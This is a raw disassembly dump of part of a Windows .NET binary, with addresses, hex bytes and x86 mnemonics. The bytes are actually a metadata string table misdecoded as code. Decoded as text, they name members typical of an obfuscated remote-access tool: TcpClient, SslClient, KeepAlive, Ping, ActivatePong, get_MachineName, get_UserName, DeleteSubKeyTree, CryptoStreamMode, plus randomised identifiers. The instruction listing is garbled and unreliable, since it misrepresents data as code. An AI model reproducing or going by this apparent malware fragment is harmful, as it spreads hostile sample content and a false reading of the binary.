  408497:	6e                   	outsb  %ds:(%esi),(%dx)
  408498:	6e                   	outsb  %ds:(%esi),(%dx)
  408499:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40849e:	00 73 65             	add    %dh,0x65(%ebx)
  4084a1:	74 5f                	je     0x408502
  4084a3:	49                   	dec    %ecx
  4084a4:	73 43                	jae    0x4084e9
  4084a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a9:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4084ae:	00 53 54             	add    %dl,0x54(%ebx)
  4084b1:	51                   	push   %ecx
  4084b2:	57                   	push   %edi
  4084b3:	54                   	push   %esp
  4084b4:	76 65                	jbe    0x40851b
  4084b6:	5a                   	pop    %edx
  4084b7:	55                   	push   %ebp
  4084b8:	50                   	push   %eax
  4084b9:	57                   	push   %edi
  4084ba:	74 57                	je     0x408513
  4084bc:	77 66                	ja     0x408524
  4084be:	64 00 6c 6c 76       	add    %ch,%fs:0x76(%esp,%ebp,2)
  4084c3:	42                   	inc    %edx
  4084c4:	6d                   	insl   (%dx),%es:(%edi)
  4084c5:	47                   	inc    %edi
  4084c6:	4e                   	dec    %esi
  4084c7:	4a                   	dec    %edx
  4084c8:	53                   	push   %ebx
  4084c9:	53                   	push   %ebx
  4084ca:	77 73                	ja     0x40853f
  4084cc:	43                   	inc    %ebx
  4084cd:	67 64 00 67 65       	add    %ah,%fs:0x65(%bx)
  4084d2:	74 5f                	je     0x408533
  4084d4:	47                   	inc    %edi
  4084d5:	75 69                	jne    0x408540
  4084d7:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4084db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084dd:	64 53                	fs push %ebx
  4084df:	79 6e                	jns    0x40854f
  4084e1:	63 3e                	arpl   %edi,(%esi)
  4084e3:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084e7:	61                   	popa
  4084e8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ec:	67 46                	addr16 inc %esi
  4084ee:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4084f5:	73 43                	jae    0x40853a
  4084f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fa:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4084ff:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408504:	61                   	popa
  408505:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408508:	6e                   	outsb  %ds:(%esi),(%dx)
  408509:	67 46                	addr16 inc %esi
  40850b:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  408512:	65 65 70 41          	gs gs jo 0x408557
  408516:	6c                   	insb   (%dx),%es:(%edi)
  408517:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  40851e:	42                   	inc    %edx
  40851f:	61                   	popa
  408520:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408523:	6e                   	outsb  %ds:(%esi),(%dx)
  408524:	67 46                	addr16 inc %esi
  408526:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  40852d:	65 61                	gs popa
  40852f:	64 65 72 53          	fs gs jb 0x408586
  408533:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  40853a:	42                   	inc    %edx
  40853b:	61                   	popa
  40853c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40853f:	6e                   	outsb  %ds:(%esi),(%dx)
  408540:	67 46                	addr16 inc %esi
  408542:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408549:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  408550:	42                   	inc    %edx
  408551:	61                   	popa
  408552:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408555:	6e                   	outsb  %ds:(%esi),(%dx)
  408556:	67 46                	addr16 inc %esi
  408558:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  40855f:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408563:	61                   	popa
  408564:	74 65                	je     0x4085cb
  408566:	50                   	push   %eax
  408567:	6f                   	outsl  %ds:(%esi),(%dx)
  408568:	6e                   	outsb  %ds:(%esi),(%dx)
  408569:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  40856f:	61                   	popa
  408570:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408573:	6e                   	outsb  %ds:(%esi),(%dx)
  408574:	67 46                	addr16 inc %esi
  408576:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40857d:	6e                   	outsb  %ds:(%esi),(%dx)
  40857e:	74 65                	je     0x4085e5
  408580:	72 76                	jb     0x4085f8
  408582:	61                   	popa
  408583:	6c                   	insb   (%dx),%es:(%edi)
  408584:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408589:	61                   	popa
  40858a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40858d:	6e                   	outsb  %ds:(%esi),(%dx)
  40858e:	67 46                	addr16 inc %esi
  408590:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408597:	75 66                	jne    0x4085ff
  408599:	66 65 72 3e          	data16 gs jb 0x4085db
  40859d:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4085a1:	61                   	popa
  4085a2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a6:	67 46                	addr16 inc %esi
  4085a8:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  4085af:	66 66 73 65          	data16 data16 jae 0x408618
  4085b3:	74 3e                	je     0x4085f3
  4085b5:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4085b9:	61                   	popa
  4085ba:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085be:	67 46                	addr16 inc %esi
  4085c0:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  4085c7:	73 6c                	jae    0x408635
  4085c9:	43                   	inc    %ebx
  4085ca:	6c                   	insb   (%dx),%es:(%edi)
  4085cb:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4085d2:	5f                   	pop    %edi
  4085d3:	42                   	inc    %edx
  4085d4:	61                   	popa
  4085d5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4085d9:	67 46                	addr16 inc %esi
  4085db:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4085e2:	63 70 43             	arpl   %esi,0x43(%eax)
  4085e5:	6c                   	insb   (%dx),%es:(%edi)
  4085e6:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4085ed:	5f                   	pop    %edi
  4085ee:	42                   	inc    %edx
  4085ef:	61                   	popa
  4085f0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4085f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f4:	67 46                	addr16 inc %esi
  4085f6:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4085fd:	70 65                	jo     0x408664
  4085ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408600:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  408604:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  40860b:	61 
  40860c:	6c                   	insb   (%dx),%es:(%edi)
  40860d:	75 65                	jne    0x408674
  40860f:	4b                   	dec    %ebx
  408610:	69 6e 64 00 6a 75 7a 	imul   $0x7a756a00,0x64(%esi),%ebp
  408617:	6d                   	insl   (%dx),%es:(%edi)
  408618:	6d                   	insl   (%dx),%es:(%edi)
  408619:	75 49                	jne    0x408664
  40861b:	54                   	push   %esp
  40861c:	5a                   	pop    %edx
  40861d:	43                   	inc    %ebx
  40861e:	43                   	inc    %ebx
  40861f:	74 64                	je     0x408685
  408621:	00 4b 6e             	add    %cl,0x6e(%ebx)
  408624:	65 44                	gs inc %esp
  408626:	79 53                	jns    0x40867b
  408628:	75 56                	jne    0x408680
  40862a:	76 64                	jbe    0x408690
  40862c:	00 63 66             	add    %ah,0x66(%ebx)
  40862f:	51                   	push   %ecx
  408630:	73 66                	jae    0x408698
  408632:	4d                   	dec    %ebp
  408633:	50                   	push   %eax
  408634:	6a 59                	push   $0x59
  408636:	46                   	inc    %esi
  408637:	65 00 57 6b          	add    %dl,%gs:0x6b(%edi)
  40863b:	6a 73                	push   $0x73
  40863d:	70 6a                	jo     0x4086a9
  40863f:	62 69 50             	bound  %ebp,0x50(%ecx)
  408642:	4f                   	dec    %edi
  408643:	55                   	push   %ebp
  408644:	6d                   	insl   (%dx),%es:(%edi)
  408645:	45                   	inc    %ebp
  408646:	49                   	dec    %ecx
  408647:	6c                   	insb   (%dx),%es:(%edi)
  408648:	4d                   	dec    %ebp
  408649:	65 00 72 6f          	add    %dh,%gs:0x6f(%edx)
  40864d:	42                   	inc    %edx
  40864e:	65 58                	gs pop %eax
  408650:	78 55                	js     0x4086a7
  408652:	68 4e 65 00 52       	push   $0x5200654e
  408657:	65 70 6c             	gs jo  0x4086c6
  40865a:	61                   	popa
  40865b:	63 65 00             	arpl   %esp,0x0(%ebp)
  40865e:	43                   	inc    %ebx
  40865f:	72 65                	jb     0x4086c6
  408661:	61                   	popa
  408662:	74 65                	je     0x4086c9
  408664:	49                   	dec    %ecx
  408665:	6e                   	outsb  %ds:(%esi),(%dx)
  408666:	73 74                	jae    0x4086dc
  408668:	61                   	popa
  408669:	6e                   	outsb  %ds:(%esi),(%dx)
  40866a:	63 65 00             	arpl   %esp,0x0(%ebp)
  40866d:	73 65                	jae    0x4086d4
  40866f:	74 5f                	je     0x4086d0
  408671:	4d                   	dec    %ebp
  408672:	6f                   	outsl  %ds:(%esi),(%dx)
  408673:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408678:	6c                   	insb   (%dx),%es:(%edi)
  408679:	65 4d                	gs dec %ebp
  40867b:	6f                   	outsl  %ds:(%esi),(%dx)
  40867c:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408681:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408688:	64 65 
  40868a:	00 45 6e             	add    %al,0x6e(%ebp)
  40868d:	74 65                	je     0x4086f4
  40868f:	72 44                	jb     0x4086d5
  408691:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408695:	4d                   	dec    %ebp
  408696:	6f                   	outsl  %ds:(%esi),(%dx)
  408697:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40869c:	79 70                	jns    0x40870e
  40869e:	74 6f                	je     0x40870f
  4086a0:	53                   	push   %ebx
  4086a1:	74 72                	je     0x408715
  4086a3:	65 61                	gs popa
  4086a5:	6d                   	insl   (%dx),%es:(%edi)
  4086a6:	4d                   	dec    %ebp
  4086a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a8:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4086ad:	6d                   	insl   (%dx),%es:(%edi)
  4086ae:	70 72                	jo     0x408722
  4086b0:	65 73 73             	gs jae 0x408726
  4086b3:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4086ba:	00 43 69             	add    %al,0x69(%ebx)
  4086bd:	70 68                	jo     0x408727
  4086bf:	65 72 4d             	gs jb  0x40870f
  4086c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c3:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4086c8:	6c                   	insb   (%dx),%es:(%edi)
  4086c9:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4086ce:	64 65 00 6a 41       	fs add %ch,%gs:0x41(%edx)
  4086d3:	74 48                	je     0x40871d
  4086d5:	78 6f                	js     0x408746
  4086d7:	66 62 6a 41          	bound  %bp,0x41(%edx)
  4086db:	67 65 6c             	gs insb (%dx),%es:(%di)
  4086de:	65 65 00 44 65 6c    	gs add %al,%gs:0x6c(%ebp,%eiz,2)
  4086e4:	65 74 65             	gs je  0x40874c
  4086e7:	53                   	push   %ebx
  4086e8:	75 62                	jne    0x40874c
  4086ea:	4b                   	dec    %ebx
  4086eb:	65 79 54             	gs jns 0x408742
  4086ee:	72 65                	jb     0x408755
  4086f0:	65 00 50 6e          	add    %dl,%gs:0x6e(%eax)
  4086f4:	56                   	push   %esi
  4086f5:	4e                   	dec    %esi
  4086f6:	4d                   	dec    %ebp
  4086f7:	43                   	inc    %ebx
  4086f8:	61                   	popa
  4086f9:	6c                   	insb   (%dx),%es:(%edi)
  4086fa:	66 65 00 67 65       	data16 add %ah,%gs:0x65(%edi)
  4086ff:	74 5f                	je     0x408760
  408701:	4d                   	dec    %ebp
  408702:	65 73 73             	gs jae 0x408778
  408705:	61                   	popa
  408706:	67 65 00 63 59       	add    %ah,%gs:0x59(%bp,%di)
  40870b:	74 72                	je     0x40877f
  40870d:	73 45                	jae    0x408754
  40870f:	43                   	inc    %ebx
  408710:	46                   	inc    %esi
  408711:	76 50                	jbe    0x408763
  408713:	61                   	popa
  408714:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408718:	6e                   	outsb  %ds:(%esi),(%dx)
  408719:	76 6f                	jbe    0x40878a
  40871b:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  40871f:	45                   	inc    %ebp
  408720:	6e                   	outsb  %ds:(%esi),(%dx)
  408721:	75 6d                	jne    0x408790
  408723:	65 72 61             	gs jb  0x408787
  408726:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40872a:	49                   	dec    %ecx
  40872b:	44                   	inc    %esp
  40872c:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408733:	6c                   	insb   (%dx),%es:(%edi)
  408734:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  408739:	6f                   	outsl  %ds:(%esi),(%dx)
  40873a:	75 62                	jne    0x40879e
  40873c:	6c                   	insb   (%dx),%es:(%edi)
  40873d:	65 00 61 54          	add    %ah,%gs:0x54(%ecx)
  408741:	4b                   	dec    %ebx
  408742:	44                   	inc    %esp
  408743:	71 7a                	jno    0x4087bf
  408745:	49                   	dec    %ecx
  408746:	49                   	dec    %ecx
  408747:	4c                   	dec    %esp
  408748:	6a 55                	push   $0x55
  40874a:	49                   	dec    %ecx
  40874b:	6c                   	insb   (%dx),%es:(%edi)
  40874c:	64 6c                	fs insb (%dx),%es:(%edi)
  40874e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408752:	74 5f                	je     0x4087b3
  408754:	48                   	dec    %eax
  408755:	61                   	popa
  408756:	6e                   	outsb  %ds:(%esi),(%dx)
  408757:	64 6c                	fs insb (%dx),%es:(%edi)
  408759:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40875d:	6e                   	outsb  %ds:(%esi),(%dx)
  40875e:	74 69                	je     0x4087c9
  408760:	6d                   	insl   (%dx),%es:(%edi)
  408761:	65 46                	gs inc %esi
  408763:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  40876a:	64 6c                	fs insb (%dx),%es:(%edi)
  40876c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408770:	74 4d                	je     0x4087bf
  408772:	6f                   	outsl  %ds:(%esi),(%dx)
  408773:	64 75 6c             	fs jne 0x4087e2
  408776:	65 48                	gs dec %eax
  408778:	61                   	popa
  408779:	6e                   	outsb  %ds:(%esi),(%dx)
  40877a:	64 6c                	fs insb (%dx),%es:(%edi)
  40877c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408780:	6e                   	outsb  %ds:(%esi),(%dx)
  408781:	74 69                	je     0x4087ec
  408783:	6d                   	insl   (%dx),%es:(%edi)
  408784:	65 54                	gs push %esp
  408786:	79 70                	jns    0x4087f8
  408788:	65 48                	gs dec %eax
  40878a:	61                   	popa
  40878b:	6e                   	outsb  %ds:(%esi),(%dx)
  40878c:	64 6c                	fs insb (%dx),%es:(%edi)
  40878e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408792:	74 54                	je     0x4087e8
  408794:	79 70                	jns    0x408806
  408796:	65 46                	gs inc %esi
  408798:	72 6f                	jb     0x408809
  40879a:	6d                   	insl   (%dx),%es:(%edi)
  40879b:	48                   	dec    %eax
  40879c:	61                   	popa
  40879d:	6e                   	outsb  %ds:(%esi),(%dx)
  40879e:	64 6c                	fs insb (%dx),%es:(%edi)
  4087a0:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  4087a4:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4087ab:	65 
  4087ac:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  4087b0:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  4087b7:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  4087be:	6e 
  4087bf:	52                   	push   %edx
  4087c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c1:	6c                   	insb   (%dx),%es:(%edi)
  4087c2:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  4087c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4087c9:	77 73                	ja     0x40883e
  4087cb:	42                   	inc    %edx
  4087cc:	75 69                	jne    0x408837
  4087ce:	6c                   	insb   (%dx),%es:(%edi)
  4087cf:	74 49                	je     0x40881a
  4087d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d2:	52                   	push   %edx
  4087d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d4:	6c                   	insb   (%dx),%es:(%edi)
  4087d5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087d9:	74 5f                	je     0x40883a
  4087db:	4d                   	dec    %ebp
  4087dc:	61                   	popa
  4087dd:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4087e4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087ec:	73 4d                	jae    0x40883b
  4087ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ef:	64 75 6c             	fs jne 0x40885e
  4087f2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4087f6:	74 5f                	je     0x408857
  4087f8:	57                   	push   %edi
  4087f9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408800:	79 6c                	jns    0x40886e
  408802:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408806:	6f                   	outsl  %ds:(%esi),(%dx)
  408807:	63 65 73             	arpl   %esp,0x73(%ebp)
  40880a:	73 57                	jae    0x408863
  40880c:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408813:	79 6c                	jns    0x408881
  408815:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408819:	74 5f                	je     0x40887a
  40881b:	4e                   	dec    %esi
  40881c:	61                   	popa
  40881d:	6d                   	insl   (%dx),%es:(%edi)
  40881e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408822:	74 5f                	je     0x408883
  408824:	46                   	inc    %esi
  408825:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40882c:	00 
  40882d:	73 65                	jae    0x408894
  40882f:	74 5f                	je     0x408890
  408831:	46                   	inc    %esi
  408832:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408839:	00 
  40883a:	47                   	inc    %edi
  40883b:	65 74 54             	gs je  0x408892
  40883e:	65 6d                	gs insl (%dx),%es:(%edi)
  408840:	70 46                	jo     0x408888
  408842:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408849:	00 
  40884a:	47                   	inc    %edi
  40884b:	65 74 46             	gs je  0x408894
  40884e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408855:	00 
  408856:	67 65 74 5f          	addr16 gs je 0x4088b9
  40885a:	4d                   	dec    %ebp
  40885b:	61                   	popa
  40885c:	63 68 69             	arpl   %ebp,0x69(%eax)
  40885f:	6e                   	outsb  %ds:(%esi),(%dx)
  408860:	65 4e                	gs dec %esi
  408862:	61                   	popa
  408863:	6d                   	insl   (%dx),%es:(%edi)
  408864:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408868:	74 5f                	je     0x4088c9
  40886a:	4f                   	dec    %edi
  40886b:	53                   	push   %ebx
  40886c:	46                   	inc    %esi
  40886d:	75 6c                	jne    0x4088db
  40886f:	6c                   	insb   (%dx),%es:(%edi)
  408870:	4e                   	dec    %esi
  408871:	61                   	popa
  408872:	6d                   	insl   (%dx),%es:(%edi)
  408873:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408877:	74 5f                	je     0x4088d8
  408879:	46                   	inc    %esi
  40887a:	75 6c                	jne    0x4088e8
  40887c:	6c                   	insb   (%dx),%es:(%edi)
  40887d:	4e                   	dec    %esi
  40887e:	61                   	popa
  40887f:	6d                   	insl   (%dx),%es:(%edi)
  408880:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408884:	74 5f                	je     0x4088e5
  408886:	55                   	push   %ebp
  408887:	73 65                	jae    0x4088ee
  408889:	72 4e                	jb     0x4088d9
  40888b:	61                   	popa
  40888c:	6d                   	insl   (%dx),%es:(%edi)
  40888d:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408891:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408895:	6f                   	outsl  %ds:(%esi),(%dx)
  408896:	73 74                	jae    0x40890c
  408898:	4e                   	dec    %esi
  408899:	61                   	popa
  40889a:	6d                   	insl   (%dx),%es:(%edi)
  40889b:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4088a0:	65 54                	gs push %esp
  4088a2:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  4088a9:	5f                   	pop    %edi
  4088aa:	4c                   	dec    %esp
  4088ab:	61                   	popa
  4088ac:	73 74                	jae    0x408922
  4088ae:	57                   	push   %edi
  4088af:	72 69                	jb     0x40891a
  4088b1:	74 65                	je     0x408918
  4088b3:	54                   	push   %esp
  4088b4:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  4088bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4088bc:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  4088c3:	54                   	push   %esp
  4088c4:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  4088cb:	74 65                	je     0x408932
  4088cd:	4c                   	dec    %esp
  4088ce:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4088d5:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4088d8:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4088dc:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4088e3:	6d                   	insl   (%dx),%es:(%edi)
  4088e4:	65 54                	gs push %esp
  4088e6:	79 70                	jns    0x408958
  4088e8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4088ec:	74 5f                	je     0x40894d
  4088ee:	56                   	push   %esi
  4088ef:	61                   	popa
  4088f0:	6c                   	insb   (%dx),%es:(%edi)
  4088f1:	75 65                	jne    0x408958
  4088f3:	54                   	push   %esp
  4088f4:	79 70                	jns    0x408966
  4088f6:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4088fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4088fb:	74 6f                	je     0x40896c
  4088fd:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408900:	54                   	push   %esp
  408901:	79 70                	jns    0x408973
  408903:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408907:	74 54                	je     0x40895d
  408909:	79 70                	jns    0x40897b
  40890b:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40890f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408912:	74 54                	je     0x408968
  408914:	79 70                	jns    0x408986
  408916:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40891a:	6c                   	insb   (%dx),%es:(%edi)
  40891b:	65 53                	gs push %ebx
  40891d:	68 61 72 65 00       	push   $0x657261
  408922:	53                   	push   %ebx
  408923:	79 73                	jns    0x408998
  408925:	74 65                	je     0x40898c
  408927:	6d                   	insl   (%dx),%es:(%edi)
  408928:	2e 43                	cs inc %ebx
  40892a:	6f                   	outsl  %ds:(%esi),(%dx)
  40892b:	72 65                	jb     0x408992
  40892d:	00 43 6c             	add    %al,0x6c(%ebx)
  408930:	6f                   	outsl  %ds:(%esi),(%dx)
  408931:	73 65                	jae    0x408998
  408933:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408937:	70 6f                	jo     0x4089a8
  408939:	73 65                	jae    0x4089a0
  40893b:	00 50 61             	add    %dl,0x61(%eax)
  40893e:	72 73                	jb     0x4089b3
  408940:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408944:	72 52                	jb     0x408998
  408946:	65 76 65             	gs jbe 0x4089ae
  408949:	72 73                	jb     0x4089be
  40894b:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40894f:	30 39                	xor    %bh,(%ecx)
  408951:	43                   	inc    %ebx
  408952:	65 72 74             	gs jb  0x4089c9
  408955:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40895c:	00 43 72             	add    %al,0x72(%ebx)
  40895f:	65 61                	gs popa
  408961:	74 65                	je     0x4089c8
  408963:	00 53 65             	add    %dl,0x65(%ebx)
  408966:	74 54                	je     0x4089bc
  408968:	68 72 65 61 64       	push   $0x64616572
  40896d:	45                   	inc    %ebp
  40896e:	78 65                	js     0x4089d5
  408970:	63 75 74             	arpl   %esi,0x74(%ebp)
  408973:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40897a:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40897f:	65 74 65             	gs je  0x4089e7
  408982:	00 43 61             	add    %al,0x61(%ebx)
  408985:	6c                   	insb   (%dx),%es:(%edi)
  408986:	6c                   	insb   (%dx),%es:(%edi)
  408987:	53                   	push   %ebx
  408988:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40898f:	74 
  408990:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408994:	6d                   	insl   (%dx),%es:(%edi)
  408995:	70 69                	jo     0x408a00
  408997:	6c                   	insb   (%dx),%es:(%edi)
  408998:	65 72 47             	gs jb  0x4089e2
  40899b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40899d:	65 72 61             	gs jb  0x408a01
  4089a0:	74 65                	je     0x408a07
  4089a2:	64 41                	fs inc %ecx
  4089a4:	74 74                	je     0x408a1a
  4089a6:	72 69                	jb     0x408a11
  4089a8:	62 75 74             	bound  %esi,0x74(%ebp)
  4089ab:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4089b0:	75 67                	jne    0x408a19
  4089b2:	67 61                	addr16 popa
  4089b4:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4089b8:	74 74                	je     0x408a2e
  4089ba:	72 69                	jb     0x408a25
  4089bc:	62 75 74             	bound  %esi,0x74(%ebp)
  4089bf:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4089c3:	6d                   	insl   (%dx),%es:(%edi)
  4089c4:	56                   	push   %esi
  4089c5:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4089cc:	74 74                	je     0x408a42
  4089ce:	72 69                	jb     0x408a39
  4089d0:	62 75 74             	bound  %esi,0x74(%ebp)
  4089d3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089d7:	73 65                	jae    0x408a3e
  4089d9:	6d                   	insl   (%dx),%es:(%edi)
  4089da:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4089de:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4089e5:	72 
  4089e6:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4089ed:	73 73                	jae    0x408a62
  4089ef:	65 6d                	gs insl (%dx),%es:(%edi)
  4089f1:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
